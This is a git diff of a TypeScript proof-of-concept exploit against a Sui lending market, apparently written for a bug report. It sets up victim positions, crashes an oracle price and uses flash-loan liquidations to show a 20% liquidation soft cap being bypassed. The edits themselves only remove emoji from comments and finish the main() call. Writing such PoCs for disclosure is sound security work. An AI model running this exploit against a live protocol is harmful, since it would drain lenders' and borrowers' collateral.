@@ -135,7 +135,7 @@ async function setupVictim(victimKeypair: Ed25519Keypair, label: string) {
             depositTx.object(VERSION),
             depositTx.object(obligationId),
             depositTx.object(MARKET),
-            collateralCoin, // ✅ TransactionArgument langsung, bukan tx.object()
+            collateralCoin, // TransactionArgument langsung, bukan tx.object()
         ],
     });
     await executeTx(depositTx, victimKeypair);
@@ -149,7 +149,7 @@ async function setupVictim(victimKeypair: Ed25519Keypair, label: string) {
         target: `${TEST_COIN_PKG}::usdc::mint`,
         arguments: [
             supplyTx.object(USDC_TREASURY),
-            supplyTx.pure.u64(100_000_000_000_000n), // ✅ tx.pure.u64()
+            supplyTx.pure.u64(100_000_000_000_000n), // tx.pure.u64()
         ],
     });
     const [sUSDC] = supplyTx.moveCall({
@@ -158,7 +158,7 @@ async function setupVictim(victimKeypair: Ed25519Keypair, label: string) {
         arguments: [
             supplyTx.object(VERSION),
             supplyTx.object(MARKET),
-            usdcCoin, // ✅ TransactionArgument langsung
+            usdcCoin, // TransactionArgument langsung
             supplyTx.object(CLOCK),
         ],
     });
@@ -172,7 +172,7 @@ async function setupVictim(victimKeypair: Ed25519Keypair, label: string) {
         target: `${TEST_COIN_PKG}::eth::mint`,
         arguments: [
             supplyTx.object(ETH_TREASURY),
-            supplyTx.pure.u64(10_000_000_000n), // ✅ tx.pure.u64()
+            supplyTx.pure.u64(10_000_000_000n), // tx.pure.u64()
         ],
     });
     const [sETH] = supplyTx.moveCall({
@@ -181,7 +181,7 @@ async function setupVictim(victimKeypair: Ed25519Keypair, label: string) {
         arguments: [
             supplyTx.object(VERSION),
             supplyTx.object(MARKET),
-            ethCoin, // ✅ TransactionArgument langsung
+            ethCoin, // TransactionArgument langsung
             supplyTx.object(CLOCK),
         ],
     });
@@ -205,7 +205,7 @@ async function setupVictim(victimKeypair: Ed25519Keypair, label: string) {
             borrowUSDCTx.object(obligationKeyId),
             borrowUSDCTx.object(MARKET),
             borrowUSDCTx.object(REGISTRY),
-            borrowUSDCTx.pure.u64(500_000_000n), // ✅ tx.pure.u64()
+            borrowUSDCTx.pure.u64(500_000_000n), // tx.pure.u64()
             borrowUSDCTx.object(ORACLE),
             borrowUSDCTx.object(CLOCK),
         ],
@@ -225,7 +225,7 @@ async function setupVictim(victimKeypair: Ed25519Keypair, label: string) {
             borrowETHTx.object(obligationKeyId),
             borrowETHTx.object(MARKET),
             borrowETHTx.object(REGISTRY),
-            borrowETHTx.pure.u64(200_000_000n), // ✅ tx.pure.u64()
+            borrowETHTx.pure.u64(200_000_000n), // tx.pure.u64()
             borrowETHTx.object(ORACLE),
             borrowETHTx.object(CLOCK),
         ],
@@ -234,7 +234,7 @@ async function setupVictim(victimKeypair: Ed25519Keypair, label: string) {
     await executeTx(borrowETHTx, victimKeypair);
     console.log(`[${label}] Step 6 done: Borrowed 0.2 ETH`);
 
-    console.log(`[${label}] ✅ Setup complete. Obligation ID: ${obligationId}`);
+    console.log(`[${label}] Setup complete. Obligation ID: ${obligationId}`);
     return { obligationId, obligationKeyId };
 }
 
@@ -249,7 +249,7 @@ async function crashOraclePrice() {
         arguments: [
             tx.object(ORACLE),
             tx.object(CLOCK),
-            tx.pure.u64(40_000_000n), // ✅ tx.pure.u64()
+            tx.pure.u64(40_000_000n), // tx.pure.u64()
         ],
     });
     await executeTx(tx, funderKeypair);
@@ -275,7 +275,7 @@ async function beforeExploit_singleCall(victimObligationId: string) {
         arguments: [
             tx.object(VERSION),
             tx.object(MARKET),
-            tx.pure.u64(50_000_000_000n), // ✅ tx.pure.u64()
+            tx.pure.u64(50_000_000_000n), // tx.pure.u64()
         ],
     });
 
@@ -287,7 +287,7 @@ async function beforeExploit_singleCall(victimObligationId: string) {
             tx.object(VERSION),
             tx.object(victimObligationId),
             tx.object(MARKET),
-            flashUSDC, // ✅ TransactionArgument langsung
+            flashUSDC, // TransactionArgument langsung
             tx.object(REGISTRY),
             tx.object(ORACLE),
             tx.object(CLOCK),
@@ -301,7 +301,7 @@ async function beforeExploit_singleCall(victimObligationId: string) {
         arguments: [
             tx.object(VERSION),
             tx.object(MARKET),
-            remainUSDC, // ✅ TransactionArgument langsung
+            remainUSDC, // TransactionArgument langsung
             flashReceipt,
         ],
     });
@@ -427,4 +427,7 @@ async function main() {
         const ratio = Number(afterResult.extracted) / Number(beforeResult.extracted);
         console.log(`\n[IMPACT] Multi-Call extracted ${ratio.toFixed(2)}x MORE collateral!`);
     }
-    console.log(`[IMPACT] 20% Soft Cap was BYPASSED via Multi-Call in single PTB!`
+    console.log(`[IMPACT] 20% Soft Cap was BYPASSED via Multi-Call in single PTB!`);
+}
+
+main().catch(console.error);
